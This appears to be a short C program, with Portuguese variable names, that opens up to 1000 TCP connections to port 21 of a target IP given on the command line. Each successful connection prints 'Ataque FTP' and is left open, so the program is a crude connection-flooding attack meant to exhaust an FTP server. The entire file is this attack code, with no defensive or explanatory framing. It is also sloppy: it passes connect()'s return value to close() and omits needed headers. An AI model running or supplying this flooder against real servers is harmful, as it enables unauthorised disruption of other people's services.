#include <stdio.h>
#include <netdb.h>

int main (int argc, char *argv[])
	{
		int consocket;
		int conecta;

        int ataque;
	    
		int inicio =0;
		int final = 1000;
		char * destino;
		
        destino = argv[1];

		struct sockaddr_in alvo;

		for(ataque=inicio;ataque<final;ataque++)
		{
		consocket = socket(AF_INET, SOCK_STREAM, 0);
		alvo.sin_family = AF_INET;
		alvo.sin_port = htons(21);
		alvo.sin_addr.s_addr = inet_addr(destino);

		conecta = connect(consocket, (struct sockaddr *)&alvo, sizeof alvo);

		if (conecta == 0)
		{
			printf("Ataque FTP \n");
		} else {
			close(consocket);
			close(conecta);
			}
	
		}
	}
